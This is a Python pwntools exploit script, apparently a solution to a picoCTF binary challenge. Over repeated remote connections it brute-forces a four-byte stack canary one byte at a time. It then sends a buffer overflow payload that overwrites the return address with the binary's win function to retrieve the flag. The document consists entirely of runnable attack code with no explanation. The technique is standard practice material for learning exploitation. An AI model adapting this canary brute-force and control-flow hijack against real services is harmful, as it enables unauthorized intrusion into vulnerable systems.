from pwn import *

context.log_level = 'critical'

def brute_canary():
	canary = bytearray(b'')
	while len(canary) < 4:
		for i in range(256):
			target = remote(address, port)

			currentValue = chr(i).encode()
			payload = overflow + canary + currentValue

			target.sendlineafter(b'>',str(len(payload)).encode())
			target.sendlineafter(b'Input>',payload)

			recvData = target.recvall().decode()
			if 'Flag?' in recvData:
				canary += currentValue
				break
	return canary

address = 'saturn.picoctf.net'
port = 52224

context.binary = binary = ELF('vuln')

overflow = b'A' * 64
win = p32(binary.symbols.win)
canary = brute_canary()

print(f'Canary: {canary.decode()}')

payload = overflow
payload += canary
payload += b'B' * 16
payload += win

target = remote(address, port)

target.sendlineafter(b'>',b'1000')
target.sendlineafter(b'Input>',payload)

flagData = target.recvall().decode()
print(f'Flag: {flagData[flagData.index("pico"):flagData.index("}")+1]}')
